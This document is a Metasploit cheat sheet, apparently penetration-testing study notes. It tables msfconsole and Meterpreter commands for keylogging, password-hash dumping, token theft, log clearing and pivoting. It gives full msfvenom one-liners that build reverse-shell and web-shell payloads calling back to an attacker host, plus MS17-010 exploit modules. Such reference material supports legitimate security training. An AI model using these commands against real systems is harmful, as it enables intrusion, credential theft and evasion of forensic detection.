# Metasploit Framework

## **Introduction**

> The Metasploit Framework is a Ruby-based penetration testing platform that writing, testing, and executing exploit code.\
> Metasploit contains a suite of tools to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.

***

## **MSFconsole Commands**

| Command       | Description                                                          |
| ------------- | -------------------------------------------------------------------- |
| show exploits | Show all exploits within the Framework.                              |
| show payloads | Show all payloads within the Framework.                              |
| setg          | Set a specific value globally (for example, LHOST or RHOST).         |
| show options  | Show the options available for a module or exploit.                  |
| show targets  | Show the platforms supported by the exploit.                         |
| set target    | Specify a specific target index if you know the OS and service pack. |
| set payload   | Specify the payload to use.                                          |
| show advanced | Show advanced options.                                               |
| sessions -l   | List available sessions (used when handling multiple shells).        |
| sessions -i   | Interact with a session                                              |
| sessions -K   | Kill all live sessions.                                              |
| sessions -c   | Execute a command on all live Meterpreter sessions.                  |
| sessions -u   | Upgrade a normal Win32 shell to a Meterpreter console.               |

***

## **Meterpreter Commands**

| Command                                    | Description                                                                                   |
| ------------------------------------------ | --------------------------------------------------------------------------------------------- |
| migrate \<proc. id>                        | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
| list\_tokens -u                            | List available tokens on the target by user.                                                  |
| list\_tokens -g                            | List available tokens on the target by group.                                                 |
| impersonate\_token \<DOMAIN\_NAMEUSERNAME> | Impersonate a token available on the target.                                                  |
| steal\_token \<proc. id>                   | Steal the tokens available for a given process and impersonate that token.                    |
| drop\_token                                | Stop impersonating the current token.                                                         |
| getsystem                                  | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.        |
| shell                                      | Drop into an interactive shell with all available tokens.                                     |
| execute -f \<cmd.exe> -i                   | Execute cmd.exe and interact with it.                                                         |
| execute -f \<cmd.exe> -i -t                | Execute cmd.exe with all available tokens.                                                    |
| execute -f \<cmd.exe> -i -H -t             | Execute cmd.exe with all available tokens and make it a hidden process.                       |
| rev2self                                   | Revert back to the original user you used to compromise the target.                           |
| reg                                        | Interact, create, delete, query, set, and much more in the target’s registry.                 |
| setdesktop                                 | Switch to a different screen based on who is logged in.                                       |
| screenshot                                 | Take a screenshot of the target’s screen.                                                     |
| upload                                     | Upload a file to the target.                                                                  |
| download                                   | Download a file from the target.                                                              |
| keyscan\_start                             | Start sniffing keystrokes on the remote target.                                               |
| keyscan\_dump                              | Dump the remote keys captured on the target.                                                  |
| keyscan\_stop                              | Stop sniffing keystrokes on the remote target.                                                |
| getprivs                                   | Get as many privileges as possible on the target.                                             |
| uictl enable \<keyboard/mouse>             | Take control of the keyboard and/or mouse.                                                    |
| background                                 | Run your current Meterpreter shell in the background.                                         |
| hashdump                                   | Dump all hashes on the target. use sniffer Load the sniffer module.                           |
| sniffer\_interfaces                        | List the available interfaces on the target.                                                  |
| sniffer\_dump pcapname                     | Start sniffing on the remote target.                                                          |
| sniffer\_start packet-buffer               | Start sniffing with a specific range for a packet buffer.                                     |
| sniffer\_stats                             | Grab statistical information from the interface you are sniffing.                             |
| sniffer\_stop                              | Stop the sniffer.                                                                             |
| add\_user -h                               | Add a user on the remote target.                                                              |
| add\_group\_user <"Domain Admins"> -h      | Add a username to the Domain Administrators group on the remote target.                       |
| clearev                                    | Clear the event log on the target machine.                                                    |
| timestomp                                  | Change file attributes, such as creation date (antiforensics measure).                        |
| reboot                                     | Reboot the target machine.                                                                    |

***

## **Common Meterpreter Payloads for Windows**

| Payload                           | Description                                                            |
| --------------------------------- | ---------------------------------------------------------------------- |
| generic/custom                    | Generic listener, multi-use                                            |
| generic/shell\_bind\_tcp          | Generic listener, multi-use, normal shell, TCP connection binding      |
| generic/shell\_reverse\_tcp       | Generic listener, multi-use, normal shell, reverse TCP connection      |
| windows/x64/exec                  | Executes an arbitrary command (Windows x64)                            |
| windows/x64/loadlibrary           | Loads an arbitrary x64 library path                                    |
| windows/x64/messagebox            | Spawns a dialog via MessageBox using a customizable title, text & icon |
| windows/x64/shell\_reverse\_tcp   | Normal shell, single payload, reverse TCP connection                   |
| windows/x64/shell/reverse\_tcp    | Normal shell, stager + stage, reverse TCP connection                   |
| windows/x64/shell/bind\_ipv6\_tcp | Normal shell, stager + stage, IPv6 Bind TCP stager                     |
| windows/x64/meterpreter/$         | Meterpreter payload + varieties above                                  |
| windows/x64/powershell/$          | Interactive PowerShell sessions + varieties above                      |
| windows/x64/vncinject/$           | VNC Server (Reflective Injection) + varieties above                    |

***

## **Importing External Exploits into MSFConsole**

> The default directory where all the modules, scripts, plugins, and `msfconsole` proprietary files are stored is `/usr/share/metasploit-framework`\
> Alternatively, you can use the folder `/home/username/.msf4`\
> To import a module, you just need to copy it in one of the previous folders and use the `reload_all` command.\
> Alternatively, you can load a module at runtime by using `loadpath /usr/share/metasploit-framework/modules/`\
>

***

## **Meterpreter Pivoting**

| Command                                       | Description                                                                                                                     |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| portfwd add -R -l 8443 -p 1234 -L 10.10.14.15 | Set up a local port forwarding rule to forward all traffic destined to port 1234 on 10.10.14.15 to port 8443 on our attack host |
| run autoroute -s 172.16.9.0/23                | set up a route to the 172.16.9.0/23 subnet                                                                                      |

***

## **Msfconsole & Msfvenom**

| Commands                                                                                          | Description                                                                                                                 |
| ------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| use exploit/windows/smb/psexec                                                                    | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec |
| shell                                                                                             | Command used in a meterpreter shell session to drop into a system shell                                                     |
| msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf    | MSFvenom command used to generate a linux-based reverse shell stageless payload                                             |
| msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe      | MSFvenom command used to generate a Windows-based reverse shell stageless payload                                           |
| msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho  | MSFvenom command used to generate a MacOS-based reverse shell payload                                                       |
| msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp | MSFvenom command used to generate a ASP web reverse shell payload                                                           |
| msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp    | MSFvenom command used to generate a JSP web reverse shell payload                                                           |
| msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war    | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload                                       |
| use auxiliary/scanner/smb/smb\_ms17\_010                                                          | Metasploit exploit module used to check if a host is vulnerable to ms17\_010                                                |
| use exploit/windows/smb/ms17\_010\_psexec                                                         | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17\_010    |
| use exploit/linux/http/rconfig\_vendors\_auth\_file\_upload\_rce                                  | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6     |

***

## **Utilities - Exploit Suggester & HashDump**

* `local_exploit_suggester`: useful module for privesc
* `hashdump` or `comando lsa_dump_secrets` or `lsa_dump_sam`: commands to dump all passwords \\
  * Disclaimer: before using `hashdump` you need to ensure to have `root` or `nt authority system` privileges
  * To do that, use `ps` to check the permissions of the current process you are on, then use `migrate PID` on a root process, if you aren't root already
